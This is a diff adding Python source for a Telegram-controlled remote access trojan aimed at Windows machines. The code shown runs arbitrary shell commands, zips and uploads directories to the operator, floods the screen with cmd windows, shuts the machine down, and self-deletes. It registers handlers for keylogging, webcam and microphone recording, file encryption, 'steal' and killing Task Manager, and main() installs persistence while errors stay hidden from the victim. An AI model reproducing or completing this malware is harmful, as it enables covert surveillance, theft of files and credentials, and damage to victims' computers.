+def cmd_cmdbomb(bot, m):
+    n = int(m.text.split()[1]) if len(m.text.split()) > 1 else 5
+    for _ in range(n):
+        subprocess.Popen("cmd.exe", creationflags=0x00000010)
+    bot.send_message(m.chat.id, f"💣 {n} cmd")
+
+def cmd_shutdown(bot, m):
+    bot.send_message(m.chat.id, "📴 shutdown")
+    run("shutdown /s /t 1")
+
+def cmd_reboot(bot, m):
+    bot.send_message(m.chat.id, "🔄 reboot")
+    run("shutdown /r /t 1")
+
+def cmd_move(bot, m):
+    parts = m.text.split(maxsplit=2)
+    src, dst = parts[1], parts[2]
+    shutil.move(src, dst)
+    bot.send_message(m.chat.id, f"🔀 {src} -> {dst}")
+
+def cmd_wallpaper(bot, m):
+    path = m.text.split(maxsplit=1)[1]
+    ctypes.windll.user32.SystemParametersInfoW(0x0014, 0, path, 3)
+    bot.send_message(m.chat.id, f"🖼️ {path}")
+
+def cmd_downloaddir(bot, m):
+    path = m.text.split(maxsplit=1)[1]
+    tmp = Path(tempfile.gettempdir()) / "dldir.zip"
+    shutil.make_archive(str(tmp)[:-4], "zip", path)
+    with open(tmp, "rb") as f:
+        bot.send_document(m.chat.id, f, caption=f"📦 {path}")
+    tmp.unlink(missing_ok=True)
+
+def cmd_cmd(bot, m):
+    cmdline = m.text.split(maxsplit=1)[1]
+    bot.send_message(m.chat.id, "🧾 " + run(cmdline))
+
+def cmd_selfdestruct(bot, m):
+    bot.send_message(m.chat.id, "💥 self-destruct: uninstall, remove persistence, exit.")
+    try:
+        remove_persistence()
+    except Exception:
+        pass
+    try:
+        exe = sys.executable if getattr(sys, "frozen", False) else sys.argv[0]
+        me = Path(exe).resolve()
+        subprocess.Popen(
+            f'cmd.exe /c ping 127.0.0.1 -n 3 >nul & del /F /Q "{me}"',
+            shell=True, creationflags=0x00000008,
+        )
+    except Exception:
+        pass
+    os._exit(0)
+
+
+# ---------- регистрация ----------
+
+def build_bot():
+    telebot = _lazy()
+    bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
+
+    handlers = {
+        "start": cmd_start,
+        "menu": cmd_menu,
+        "antivirus": cmd_antivirus,
+        "screenshot": cmd_screenshot,
+        "processes": cmd_processes,
+        "report": cmd_report,
+        "kill": cmd_kill,
+        "mkdir": cmd_mkdir,
+        "rmdir": cmd_rmdir,
+        "ls": cmd_ls,
+        "cd": cmd_cd,
+        "sysinfo": cmd_sysinfo,
+        "msg": cmd_msg,
+        "cam": cmd_cam,
+        "reccam": cmd_reccam,
+        "recmic": cmd_recmic,
+        "keylog": cmd_keylog,
+        "open": cmd_open,
+        "upload": cmd_upload,
+        "download": cmd_download,
+        "rm": cmd_rm,
+        "encrypt": cmd_encrypt,
+        "decrypt": cmd_decrypt,
+        "altf4": cmd_altf4,
+        "minimize": cmd_minimize,
+        "clip": cmd_clip,
+        "setclip": cmd_setclip,
+        "recscreen": cmd_recscreen,
+        "steal": cmd_steal,
+        "killtaskmgr": cmd_killtaskmgr,
+        "openurl": cmd_openurl,
+        "volup": cmd_volup,
+        "voldown": cmd_voldown,
+        "volmax": cmd_volmax,
+        "cmdbomb": cmd_cmdbomb,
+        "shutdown": cmd_shutdown,
+        "reboot": cmd_reboot,
+        "move": cmd_move,
+        "wallpaper": cmd_wallpaper,
+        "downloaddir": cmd_downloaddir,
+        "cmd": cmd_cmd,
+        "selfdestruct": cmd_selfdestruct,
+    }
+    for name, fn in handlers.items():
+        wrapped = safe(fn)
+        # telebot требует декоратор с функцией-приёмником
+        def make(f):
+            def reg(message):
+                return f(message)
+            return reg
+        bot.register_message_handler(
+            make(lambda mm, _f=fn: _f(bot, mm)),
+            commands=[name],
+        )
+    return bot
+
+
+def main():
+    install_persistence()
+    bot = build_bot()
+    # run в отдельном потоке, чтобы keylog-хук не блокировал polling
+    bot.infinity_polling(skip_pending=True, timeout=30, long_polling_timeout=25)
+
+
+if __name__ == "__main__":
+    try:
+        main()
+    except Exception as e:
+        # тихий выход, чтобы не всплывало окно ошибки
+        try:
+            with open(os.path.join(tempfile.gettempdir(), "rat_err.log"), "a") as f:
+                f.write(f"{datetime.now()} {e}\n")
+        except Exception:
+            pass
+        sys.exit(1)
